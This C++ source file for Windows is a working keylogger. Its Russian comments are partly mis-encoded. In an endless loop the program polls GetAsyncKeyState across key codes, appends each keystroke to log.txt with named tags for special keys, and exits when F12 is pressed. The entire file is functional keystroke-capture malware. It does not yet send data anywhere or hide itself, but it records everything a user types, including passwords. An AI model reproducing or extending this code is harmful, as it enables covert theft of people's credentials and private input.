// Keylogger.cpp: определ€ет точку входа дл€ приложени€.
//

#include "stdafx.h"
#include "Keylogger.h"
#include <string>
#include <iostream>
#include <fstream>
#define MAX_LOADSTRING 100
using namespace std;


int WINAPI WinMain(HINSTANCE hInst, HINSTANCE P, LPSTR CMD, int nShowCmd) {


	// ÷икл основного сообщени€:
	ofstream file("log.txt", ios::app);
	int a=0;
	int shift = 0;
	while (1) {
		for (int q = 8; q <= 190; q++)
		{
			if (GetAsyncKeyState(q) == -32767) {
				if (q == 9) {

					file << "[Tab]";
				}
				else if (q == 92) {
					file << "[RWin]";
				}
				else if (q == 188) {
					file << ","; 
				}
				else if (q == 186) {
					file << ";";
				}
				else if (q == 190) {
					file << ".";
				}
				else if (q == 13) {
					file << "[Enter]";
				}
				else if (q == 91) {
					file << "[Win]";
				}
				else if (q == 165) {
					file << "[RAlt]";
				}
				else if (q == 161) {
					file << "[RShift]";
				}
				else if (q == 163) {
					file << "[RShift]";
				}
				else if (q == 160) {
					shift++;
					if (shift == 2) { file << "[Shift]"; shift = 0; }
				}
				else if (q == 16) {
					shift++;
					if (shift == 2) { file << "[Shift]"; shift = 0; }
				}
				else if (q == 164) {
					shift++;
					if (shift == 2) { file << "[Alt]"; shift = 0; }
				}
				else if (q == 162) {
					shift++;
					if (shift == 2) { file << "[Ctrl]"; shift = 0; }
				}
				else if (q == 17) {
					shift++;
					if (shift == 2) { file << "[Ctrl]"; shift = 0; }
				}
				else if (q == 18) {
					shift++;
					if (shift == 2) { file << "[Alt]"; shift = 0; }
				}
				else if (q == 44) {
					file << "[Print Screen]";
				}
				else if (q == 27) {

					file << "[Esc]";
				}
				else if (q == 112) {
					file << "[F1]";
				}
				else if (q == 113) {
					file << "[F2]";
				}
				else if (q == 114) {
					file << "[F3]";
				}
				else if (q == 115) {
					file << "[F4]";
				}
				else if (q == 116) {
					file << "[F5]";
				}
				else if (q == 117) {

					file << "[F6]";
				}
				else if (q == 118) {
					file << "[F7]";
				}
				else if (q == 119) {
					file << "[F8]";
				}
				else if (q == 120) {
					file << "[F9]";
				}
				else if (q == 121) {

					file << "[F10]";
				}
				else if (q == 122) {
					file << "[F11]";
				}
				else if (q == 123) {
					//file << "[F12]";
					file.close();
					return 0;
					//break;
				}
				else if (q == 19) {
					file << "[Pause Break]";
				}
				else if (q == 145) {
					file << "[Scroll Lock]";
				}
				else if (q == 36) {

					file << "[Home]";
				}
				else if (q == 33) {

					file << "[Page Up]";
				}
				else if (q == 8) {

					file << "[Backspace]";
				}
				else if (q == 46) {

					file << "[Delete]";
				}
				else if (q == 34) {

					file << "[Page Down]";
				}
				else if (q == 35) {

					file << "[End]";
				}
				else if (q == 144) {

					file << "[Num Lock]";
				}
				else if (q == 20) {

					file << "[Caps Lock]";
				}
				else if (q == 93) {

					file << "[ онтекстное меню]";
				}
				else if (q == 189) {

					file << "-";
				}
				else if (q == 187) {

					file << "=";
				}
				else if (q == 32) {

					file << "[Space]";
				}
				else if (q == 45) {

					file << "[Insert]";
				}
				else if (q == 37) {

					file << "[Left]";
				}
				else if (q == 38) {

					file << "[Up]";
				}
				else if (q == 39) {

					file << "[Right]";
				}
				else if (q == 40) {

					file << "[Down]";
				}
				else if (q == 110) {

					file << "[Del(.)]";
				}
				else if (q == 107) {

					file << "[+]";
				}
				else if (q == 109) {

					file << "[-(minus)]";
				}
				else if (q == 111) {

					file << "[/(деление)]";
				}
				else if (q == 106) {

					file << "[*]";
				}
				else if ((q >= 'A') && (q <= 'Z')) {

					cout << q << endl;
					file << (char) q;
				}
				else if ((q >= 96) && (q <= 105)) {

					cout << q << endl;
					file << (int) q - 96;
				}
				else if ((q >= 48) && (q <= 57)) {

					cout << q << endl;
					file << (int) q - 48;
				}
				else {
					cout << q << endl;
				}
			}
			else {
				a++;
			}
			if (a == 15)
			{
				Sleep(1);
				a = 0;

			}
		}
	}
	file.close();
	return 0;
}

